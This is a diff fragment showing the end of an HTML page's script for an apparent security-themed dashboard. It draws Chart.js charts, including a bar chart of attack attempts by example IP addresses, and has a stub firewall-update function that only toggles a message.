+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        legend: { position: 'right' }
+                    }
+                }
+            });
+
+            const ctx2 = document.getElementById('ipChart').getContext('2d');
+            ipChartInstance = new Chart(ctx2, {
+                type: 'bar',
+                data: {
+                    labels: ['192.168.1.50', '203.0.113.5', '10.0.0.88', '172.16.0.4', '45.33.22.11'],
+                    datasets: [{
+                        label: 'Attack Attempts',
+                        data: [120, 95, 80, 45, 30],
+                        backgroundColor: '#1c1917',
+                        borderRadius: 4
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    scales: {
+                        y: { beginAtZero: true }
+                    }
+                }
+            });
+        }
+
+        function updateFirewall() {
+            const msg = document.getElementById('firewall-msg');
+            msg.classList.remove('hidden');
+            setTimeout(() => {
+                msg.classList.add('hidden');
+            }, 3000);
+        }
+
+        // --- Initialization ---
+        document.addEventListener('DOMContentLoaded', () => {
+            // Ensure Arsenal is not empty on first interaction if user jumps there
+        });
+
+    </script>
+    
+    <!-- CONFIRMATION: NO SVG graphics used. NO Mermaid JS used. -->
+</body>
+</html>
+
+
+
